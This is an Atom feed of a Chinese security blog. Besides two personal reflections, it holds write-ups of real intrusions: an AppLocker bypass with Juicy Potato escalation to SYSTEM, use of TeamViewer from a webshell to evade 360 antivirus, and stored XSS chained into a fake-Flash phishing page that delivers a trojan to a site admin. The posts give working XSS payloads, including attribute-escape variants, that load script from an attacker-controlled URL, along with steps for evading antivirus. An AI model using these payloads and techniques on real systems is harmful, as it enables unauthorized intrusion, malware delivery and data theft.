<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Se7en&#39;s Blog|Learn and live</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.se7ensec.cn/"/>
  <updated>2020-01-20T07:51:05.716Z</updated>
  <id>https://www.se7ensec.cn/</id>
  
  <author>
    <name>Se7en</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>回炉再造</title>
    <link href="https://www.se7ensec.cn/2020/01/20/%E5%9B%9E%E7%82%89%E5%86%8D%E9%80%A0/"/>
    <id>https://www.se7ensec.cn/2020/01/20/回炉再造/</id>
    <published>2020-01-20T07:15:15.000Z</published>
    <updated>2020-01-20T07:51:05.716Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>安全技术学习，承认自己的弱点不是丑事。<br>只有对原理了然于心，才能突破更多的限制。        ——@ringzero </p></blockquote><a id="more"></a><p>一二三四，二二三四，转个圈圈，再来一次。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;安全技术学习，承认自己的弱点不是丑事。&lt;br&gt;只有对原理了然于心，才能突破更多的限制。        ——@ringzero &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>迟来的年度总结</title>
    <link href="https://www.se7ensec.cn/2020/01/09/%E8%BF%9F%E6%9D%A5%E7%9A%84%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://www.se7ensec.cn/2020/01/09/迟来的年度总结/</id>
    <published>2020-01-08T18:15:44.000Z</published>
    <updated>2020-01-08T18:24:56.915Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>不知道现在写年度总结是不是晚了点。</p></blockquote><a id="more"></a><h1 id="2019"><a href="#2019" class="headerlink" title="2019"></a>2019</h1><p>2019年，一切都顺顺利利，做了人生第一份实习工作，进了一些交流的小圈子，认识了些真正的”师傅”，通过论坛，公众号，QQ、微信群、小密圈等各种渠道，每天都能被动、主动的学习到各种思路和知识，做了些技术沉淀，但还是总会感觉欠缺一些东西，那就是自己的定位和发展方向。</p><p>渗透测试这条路当初既然选择了就要坚持走下去，面临知识面”深度”和”广度”的发展问题，一直是我比较迷茫的问题。</p><h4 id="选择”深度”"><a href="#选择”深度”" class="headerlink" title="选择”深度”"></a>选择”深度”</h4><p>找一个领域，深入研究，争取几年以后达到一定境界，最好是这个领域中相对领先的位置，但是感觉自己又没这么聪明，一直以来的学习，都是在模仿已有的东西，自己研究的少之又少。</p><h4 id="选择”广度”"><a href="#选择”广度”" class="headerlink" title="选择”广度”"></a>选择”广度”</h4><p>这更适合工作场景中的需求，为了达到目标要求，不择手段，需要大量的实战经验和知识面来做支撑，难易程度一点不亚于前者，或者更甚。搞渗透测试要考虑的也是一个面，要做的就是在面上找一个突破点，这个突破点不应仅仅局限在web上，所以自然而然的就要去了解一些特别的攻击手法，这也就是为什么会有”广度”的存在。这种感觉尤其在我看到的、了解的东西多了之后就越发的清晰了。</p><h1 id="2020"><a href="#2020" class="headerlink" title="2020"></a>2020</h1><h4 id="我的答案"><a href="#我的答案" class="headerlink" title="我的答案"></a>我的答案</h4><p>最近在关注一个用匿名ID的师傅写的博客，匿名可能是工作性质的原因吧，里面记录的那些内容，读完多多少少有一些共鸣，自己也找到了问题的答案，一名合格的”黑客”，在必须追求”广度”的同时，还应该合理发展自己的”深度”，这两个实际上是不冲突的，只不过是要多付出一些精力在自己比较擅长的方向，坚持做下去，耐心点总会做出成绩。</p><h4 id="未来计划"><a href="#未来计划" class="headerlink" title="未来计划"></a>未来计划</h4><p>会继续修炼web（入门容易深入难）</p><p>拓展内网渗透这个新的方向（横向，免杀，维权）</p><p>Python（思路清晰，编码高效）</p><h4 id="最终目标"><a href="#最终目标" class="headerlink" title="最终目标"></a>最终目标</h4><p>争取实现一套有着自己独到见解且相对完善的渗透测试体系</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;不知道现在写年度总结是不是晚了点。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>BC实战|后渗透之Bypass Applocker到提权</title>
    <link href="https://www.se7ensec.cn/2020/01/08/BC%E5%AE%9E%E6%88%98%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8BBypass%20Applocker%E5%88%B0%E6%8F%90%E6%9D%83/"/>
    <id>https://www.se7ensec.cn/2020/01/08/BC实战后渗透之Bypass Applocker到提权/</id>
    <published>2020-01-07T16:10:24.000Z</published>
    <updated>2020-01-07T16:30:57.927Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>冷静分析，沉着应对。</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>提示：当个反面案例看就好，实际上拿下的方式远没有下文说的那么麻烦，只怪自己太心急…<br>本来是之前BC项目搞下来的一个推广站，当时只拿到了Shell</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/1.png" alt="1"></p><p>权限是一个普通用户，想提权进一步收集服务器上的信息时，发现运行各种东西都是权限拒绝，提示组策略阻止了这个程序，当时因为还有的别的事情，就没继续研究了（用户名比较敏感，后面全程打码）。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/2.png" alt="2"></p><h1 id="0x02-Bypass-Applocker"><a href="#0x02-Bypass-Applocker" class="headerlink" title="0x02 Bypass Applocker"></a>0x02 Bypass Applocker</h1><p>最近突然想起来了，就继续搞一下，问了下群里的师傅</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/3.png" alt="3"></p><p>知道是什么东西以后就好说了，耐心找一找总会有收获的，附上Applocker介绍：</p><p><a href="https://baike.baidu.com/item/Applocker/2300852?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/Applocker/2300852?fr=aladdin</a></p><p>然后就找到3g师傅的一篇文章：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/</a></p><p>具体怎么利用就自行看文章吧，看完文章后续的大概思路差不多就清晰了</p><h1 id="0x03-上线到提权"><a href="#0x03-上线到提权" class="headerlink" title="0x03 上线到提权"></a>0x03 上线到提权</h1><p>我想的是bypass applocker让目标服务器执行我的马子上线后在进行后续的提权，然而Shell下执行 net user、tasklist /SVC 等等都没得回显，不然可以通过进程对比判断下杀软（自己写的小轮子，目前可匹配进程已经增加到960+了：<a href="http://get-av.se7ensec.cn/）" target="_blank" rel="noopener">http://get-av.se7ensec.cn/）</a></p><p>既然不知道，那我就拼一拼人品，赌一下主机里没有杀软，通过上面3g师傅文章的第三种方式运行了我的马子，然后就成功上线了，忽略下面那个机器…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/4.png" alt="4"></p><p>CS上线以后再运行某些命令，比如下面这个，还有tasklist /SCV发现还是会拒绝访问</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/5.jpg" alt="5"></p><p>然后又尝试了下CS内置的查看系统进程命令 ”ps“，成功列出了系统进程，看了下确实是没有杀软的</p><p>/* 忘了截图 */</p><p>运行 “shell systeminfo” 发现系统和补丁信息居然可以看到了，然而系统根本没打几个补丁，运气有点好，看了下用户权限，符合Juicy Potato的要求，可以直接尝试下烂土豆提权：</p><p><a href="https://www.4hou.com/posts/vZoL" target="_blank" rel="noopener">https://www.4hou.com/posts/vZoL</a></p><p>经过测试发现上线以后（实际上本来就有执行权限，当时没有想到不对劲，事后总结文章时才意识到不太对，详见文末），C:\Users\Public\下有了执行权限，用Juicy Potato带个whoami参数执行下，成功返回了system</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/6.png" alt="6"></p><p>再直接用它执行下马子，等几秒就会过来一个System的会话了，翻了翻目录发现还是个站群</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/7.png" alt="7"></p><p>Administrator权限截个屏看下，怪不得那么多，原来人家都是批量建站的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/8.png" alt="8"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>碰巧这次运气好没有遇到杀软，不然肯定会是一路坎坷，也会更有挑战性</p><p>最失败的是这次自己没有提前全面了解Applocker的一些功能介绍： <a href="https://www.anquanke.com/post/id/159892" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159892</a> ，心急的搜到了bypass方法就开始用，其实这次遇到的只是文件路径的限制，C:\Users\Public\就可以执行程序，早一点发现的话也不会那么费劲，不过能完整了解到Applocker的机制，也算是一个收获吧</p><p>最后感谢下haya、Beli1v1师傅的指点和帮助。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;冷静分析，沉着应对。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="APT相关" scheme="https://www.se7ensec.cn/categories/APT%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="WIN提权" scheme="https://www.se7ensec.cn/tags/WIN%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>TeamViewer在BypassAV中的妙用</title>
    <link href="https://www.se7ensec.cn/2020/01/05/TeamViewer%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/"/>
    <id>https://www.se7ensec.cn/2020/01/05/TeamViewer在渗透测试中的妙用/</id>
    <published>2020-01-04T18:10:24.000Z</published>
    <updated>2020-01-04T20:40:12.152Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这里直接拿360开刀，火绒安静归安静，杀毒能力还是比360差点的。</p></blockquote><a id="more"></a><h1 id="TV官方免安装版"><a href="#TV官方免安装版" class="headerlink" title="TV官方免安装版"></a>TV官方免安装版</h1><p>这是teamviewer官网下载页面： <a href="https://www.teamviewer.cn/cn/download/windows/" target="_blank" rel="noopener">https://www.teamviewer.cn/cn/download/windows/</a> ，大部分人都习惯直接下载这个安装版来用</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/1.png" alt="1"></p><p>不知道大家有没有注意过，其实teamviewer也提供了免安装版的，就在安装版的下方</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/2.png" alt="2"></p><h1 id="Bypass-360"><a href="#Bypass-360" class="headerlink" title="Bypass 360"></a>Bypass 360</h1><p>以下全部为联网且查杀引擎全开的情况下操作（见文章封面）</p><h2 id="正常运行"><a href="#正常运行" class="headerlink" title="正常运行"></a>正常运行</h2><p>下图是正常方式运行TeamViewerQS.exe，虽然有提示，但是可以看到默认的选项是 <strong>允许操作</strong> 的</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/3.png" alt="3"></p><h2 id="WebShell下运行"><a href="#WebShell下运行" class="headerlink" title="WebShell下运行"></a>WebShell下运行</h2><p>假设现在我有这台主机的WebShell，直接在大马中执行这个文件</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/4.png" alt="4"></p><p>发现成功弹了出来</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/5.png" alt="5"></p><p>但是我们怎么获取id和密码呢，土司有大佬分享过修改过的tv，支持把账号密码输出到文件，但是后期肯定还是会被杀，今天看到了CoolCat师傅的文章：<a href="https://xz.aliyun.com/t/4078" target="_blank" rel="noopener">传送门</a>，文章中有个通过截屏思路获取还是不错的，不过CoolCat师傅用的python截屏，实际上谁也不想每次都去目标机上装个python环境吧，还是应该怎么简单怎么来</p><h2 id="关于屏幕截取"><a href="#关于屏幕截取" class="headerlink" title="关于屏幕截取"></a>关于屏幕截取</h2><p>github上有不少命令行下截屏的项目，我随便找了一个：<a href="https://github.com/darealshinji/cmdline-screenshot-tool" target="_blank" rel="noopener">https://github.com/darealshinji/cmdline-screenshot-tool</a></p><p>在WebShell中，执行一下 screenshot-advanced64.exe，发现被360拦截了，c++写的东西360报java漏洞攻击我就不清楚为啥了…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/6.png" alt="6"></p><h2 id="简单绕过360"><a href="#简单绕过360" class="headerlink" title="简单绕过360"></a>简单绕过360</h2><p>这里绕过方式也很简单，screenshot-advanced64.exe 的后缀改成.7z（命令行下执行二进制文件可以无视后缀名），然后上传上来再执行</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/7.png" alt="7"></p><p>然后看一下网站根目录</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/8.png" alt="8"></p><p>screenshost.png就是生成的屏幕截图，如下</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/9.png" alt="9"></p><h1 id="Kill-360"><a href="#Kill-360" class="headerlink" title="Kill 360"></a>Kill 360</h1><p>拿着账号密码直接连，有了远程桌面的权限，360还怕干不掉？</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/10.png" alt="10"></p><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><ol><li><p>目标机要确定可以连接TeamViewer的服务器</p></li><li><p>要使用远程桌面用户权限去运行TeamViewerQS.exe，不然连上也是黑屏</p></li><li><p>以上应用场景只适合管理员不在的时候，因为一旦建立远程会话双方都是会看到的</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;这里直接拿360开刀，火绒安静归安静，杀毒能力还是比360差点的。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="APT相关" scheme="https://www.se7ensec.cn/categories/APT%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="BypassAV" scheme="https://www.se7ensec.cn/tags/BypassAV/"/>
    
  </entry>
  
  <entry>
    <title>BC实战|从Xss到主机上线</title>
    <link href="https://www.se7ensec.cn/2019/12/08/BC%E5%AE%9E%E6%88%98%E4%BB%8EXss%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/"/>
    <id>https://www.se7ensec.cn/2019/12/08/BC实战从Xss到主机上线/</id>
    <published>2019-12-08T15:10:24.000Z</published>
    <updated>2020-01-07T16:15:04.043Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>要保持学习的好习惯，这次平时学的就用上了。</p></blockquote><a id="more"></a><h1 id="故事的起因"><a href="#故事的起因" class="headerlink" title="故事的起因"></a>故事的起因</h1><p>前几天收到一封邮件，内容是这样的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/1.png" alt="1"></p><p>你说发谁哪里不好，发到我这里来，正好最近辞职了没事干，搞下看看。</p><p>加上那个人的好友以后，象征性的聊了几句，大概就是：我说自己因为网赌没钱借了高利贷，让他带我玩这个，好还上贷款，没说几句就给我发了网址和邀请码（这个站没邀请码注册不上），让我去网站里面充钱，我说好，我先去冲一千，完事师傅你一定要好好带我，然后就去注册了（后来我没充钱，他就一直抖我，给我发消息，觉得烦就把他删了，所以聊天记录也没了，简单口述下没截图）。</p><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="官网截图"><a href="#官网截图" class="headerlink" title="官网截图"></a>官网截图</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/2.png" alt="2"></p><p>信息收集阶段略过，太麻烦了，有云盾（WAF+CDN），看下面云悉指纹识别的图吧，测试各种功能点，没有结果，不得不说，大部分BC安全都是做的不错的。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/3.png" alt="3"></p><p>想了会，看到一个聊天室功能，进去看看都在说啥，结果发现说话来来回回就那几个人，偶尔有几个和我一样的普通会员，我就感觉，这尼玛是不是托啊，一堆什么导师嚷嚷着跟着下注。</p><h2 id="职业习惯："><a href="#职业习惯：" class="headerlink" title="职业习惯："></a>职业习惯：</h2><p>看见框就想叉，一发xss payload打过去：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&apos;&quot;&gt;&lt;sCRiPt sRC=XSSURL&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/4.png" alt="4"></p><p>wdnmd没反应？明明加载了啊…问了下别的师傅，说这种情况有可能是有CSP，附上<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">相关介绍</a>，我这里就不解释了，本来打算放弃，想了下万一 img 的没有被限制呢。</p><p>再吃我一发：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/5.png" alt="5"></p><p>叮 ~ 叮 ~ 手机响了，多么美妙的声音，payload成功执行，打来一堆cookie（还是不同域名），然而现实是残酷的，这个站有HttpOnly，cookie不能用，历史密码也没拿到，不过不要灰心，咱还有更猥琐的办法。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/6.png" alt="6"></p><h1 id="Flash钓鱼"><a href="#Flash钓鱼" class="headerlink" title="Flash钓鱼"></a>Flash钓鱼</h1><p>既然正面肛不动你，咱就来侧面的。前段时间经常看到无常师傅的flash钓鱼操作，很经典啊，然后就想到自己有天会用到flash官网的钓鱼源码，很早就写好了放在GitHub上：<a href="https://github.com/r00tSe7en/Fake-flash.cn" target="_blank" rel="noopener">传送门</a>。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>一个免费空间，一个免费域名（域名可以搞一个 <a href="http://www.flashxxx.tk" target="_blank" rel="noopener">www.flashxxx.tk</a> 这种的，可信度比较高），一个可以正常上线的马子。</p><p>然后xss平台搞个模块，简单解释下代码，一开始重写alert方法并屏蔽网址显示，弹出Flash升级提示，跳转至钓鱼页：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/7.png" alt="7"></p><h2 id="关于马子"><a href="#关于马子" class="headerlink" title="关于马子"></a>关于马子</h2><p>可以做到运行正常安装文件的同时运行马子，骚姿势：<a href="https://www.baikesec.com/webstudy/still/77.html" target="_blank" rel="noopener">自解压捆绑文件的利用</a></p><p>为了让自解压的exe文件可以正常运行（已经改成了正常的安装文件图标），必须确保他有解压软件，我就把钓鱼页的自解压文件压缩了下，成了 flashplayerpp_install_cn.zip，这样一来他必须安装解压文件才能打开安装程序，马子自然生效了。</p><h2 id="关于免杀"><a href="#关于免杀" class="headerlink" title="关于免杀"></a>关于免杀</h2><p>由于技术有限，毕竟咱也不是搞免杀的，生成的马子会被部分杀软报毒，也不知道对面用什么杀软，所以想了个猥琐但有效的办法，其实不少下载站下载的文件也爱这么干，哈哈。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/8.png" alt="8"></p><h2 id="一切就绪"><a href="#一切就绪" class="headerlink" title="一切就绪"></a>一切就绪</h2><p>万事俱备，只欠东风，直接发出去刚才写的升级提示+跳转的xss payload：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/9.png" alt="9"></p><p>页面成功弹出提示，对方不点确定页面就一直卡住，点了确定就跳来我的钓鱼页（这里钓鱼页也加了点料，让他点返回时无限回跳钓鱼页）</p><p>不过一开始并没有人上线，再点进去一看管理员重置了聊天页的内容。奥利给曾经说过：我们遇到什么困难也不要怕，咱换个号继续叉呗，在间歇性叉叉圈圈了十几次之后，管理员可能是实在忍不住了（管理员：大哥你别弹了，我装还不行嘛），终于运行了我的马子。</p><h2 id="成功上线："><a href="#成功上线：" class="headerlink" title="成功上线："></a>成功上线：</h2><p>这里就上线了一台，不过很幸运，是管理员的机器，不然之前的努力都白费了。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/10.png" alt="10"></p><p>看一会对面在干哈：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/11.png" alt="11"></p><p>这个清楚点，可以看到还依然打开着钓鱼页，俩人还讨论亏钱了，笑死了：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/12.png" alt="12"></p><p>打开了一个账面，这流水咱也看不懂：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/13.png" alt="13"></p><p>再看看有存着啥好东西，两个硬盘一个U盘，C盘E盘没有什么：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/14.png" alt="14"></p><p>F盘里有料了，都是一些会员数据，账单流水，管理后台配置啥的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/15.png" alt="15"></p><h1 id="点到为止："><a href="#点到为止：" class="headerlink" title="点到为止："></a>点到为止：</h1><p>不多说了，看了下上线的IP，为了挣钱跑的挺远，老哥背井离乡怪不容易的，祝你安安心心的回到祖国的怀抱过个年吧。。。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/16.png" alt="16"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;要保持学习的好习惯，这次平时学的就用上了。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="APT相关" scheme="https://www.se7ensec.cn/categories/APT%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>一处图片引用功能导致的XSS</title>
    <link href="https://www.se7ensec.cn/2019/12/04/%E4%B8%80%E5%A4%84%E5%9B%BE%E7%89%87%E5%BC%95%E7%94%A8%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84XSS/"/>
    <id>https://www.se7ensec.cn/2019/12/04/一处图片引用功能导致的XSS/</id>
    <published>2019-12-04T15:10:24.000Z</published>
    <updated>2019-12-07T07:15:27.342Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。</p></blockquote><a id="more"></a><h1 id="山重水复疑无路"><a href="#山重水复疑无路" class="headerlink" title="山重水复疑无路"></a>山重水复疑无路</h1><p><font color="#FF0000">漏洞点：站点产品评论处</font></p><h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>一开始尝试XSS，发现程序有过滤，提交均显示Tags are not permitted，最后测出来的是过滤 &lt; ，不过滤 &gt;</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/1.png" alt="1"></p><p>因为提示速度比较快，猜测前端有一层检测。尝试绕过前端检测，burp拦截正常提交的内容，替换xss payload后发送，发现会自动跳转回首页，由此发现程序后端也有内容检测，这里直接xss暂时行不通。</p><p>查看编辑器的其他功能：</p><p>图片上传：<br>可上传aspx（其他可能解析后缀均已尝试），不能解析并跳转至首页。<br>可上传html并解析，这种方式构造的xss通常需要主动攻击，且攻击时易被管理员察觉到异常，暂不考虑。</p><p>表情功能：没什么可利用的。</p><h1 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h1><p>当看到编辑器提示的 img 外部图片引用方式时引起了我的注意，这里感觉可以操作一下：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.png" alt="2"></p><h2 id="正常测试"><a href="#正常测试" class="headerlink" title="正常测试"></a>正常测试</h2><p>先来看下正常引用方式时前端的显示，链接被带入到src中（logo前文字涉及域名，打码）：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|XSSURL|xxxxx Logo]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/3.png" alt="3"></p><h2 id="带入payload"><a href="#带入payload" class="headerlink" title="带入payload"></a>带入payload</h2><p>把xss payload 放在链接的位置再看一下：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常规的payload：</span><br><span class="line">&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;&gt;</span><br><span class="line">构造的payload：</span><br><span class="line">[img|x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;|xxxxx Logo]</span><br></pre></td></tr></table></figure><p>提交后审查元素发现为如下显示：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/4.png" alt="4"></p><h2 id="尝试闭合"><a href="#尝试闭合" class="headerlink" title="尝试闭合"></a>尝试闭合</h2><p>尝试闭合 x 处的双引号，让 onerror 逃逸出来：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;|hello]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/5.png" alt="5"></p><p>这里提交后发现payload并没有执行成功，仔细看发现程序输出时分别在 onerror= 和 ; 后面加了双引号。</p><h2 id="闭合成功"><a href="#闭合成功" class="headerlink" title="闭合成功"></a>闭合成功</h2><p>直接给个 &gt; 让它闭合，虽然成功加载了，但是页面显示会有错误，这样十分容易被发现倪端，不够完美。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;&gt;|hello]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/6.png" alt="6"></p><p>换个思路通过闭合掉 ; 后面的双引号，显示效果如下：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;&quot;|hello]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/7.png" alt="7"></p><p>最终在没有任何错误内容显示的情况下成功执行了xss payload：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/8.png" alt="8"></p><p>看到这里可能有人就会想，这种案例触发的xss是不是很少存在，因为毕竟不是每个编辑器都用这种图片外链引用方式，那么请继续看下面。</p><h1 id="灵活运用"><a href="#灵活运用" class="headerlink" title="灵活运用"></a>灵活运用</h1><p>这几天在搞一个gangdu的论坛，在回复功能处，又遇到了同样的问题。</p><p>本来这个功能应该只能放图片链接的，但是这里插入的链接格式和内容并没有做校验。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.1.jpg" alt="2.1"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;</span><br></pre></td></tr></table></figure><p>这里直接把payload放进去，看下前端显示</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.2.jpg" alt="2.2"></p><p>同样的思路，这里直接闭合就好了</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&quot; onerror=&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.3.jpg" alt="2.3"></p><p>成功加载payload</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.4.jpg" alt="2.4"></p><p>平时渗透的时候，看到功能点不要上去就是蛮干，先预想下这个功能是大概怎么实现的，然后思路猥琐一点，心细一点，往往会有意想不到的收获的，就写到这里吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
